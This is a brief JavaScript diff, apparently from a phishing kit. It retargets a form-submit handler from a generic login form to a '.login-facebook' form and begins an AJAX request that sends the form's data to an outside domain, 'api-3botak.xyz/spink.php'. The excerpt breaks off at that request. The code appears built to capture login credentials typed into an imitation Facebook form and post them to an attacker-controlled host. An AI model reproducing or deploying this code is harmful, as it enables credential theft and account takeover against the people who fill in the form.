@@ -1,5 +1,5 @@
-$(".login-form").submit(function() {
-	var d = $(".login-form");
+$(".login-facebook").submit(function() {
+	var d = $(".login-facebook");
 
 	$.ajax({
         url: "https://api-3botak.xyz/spink.php",
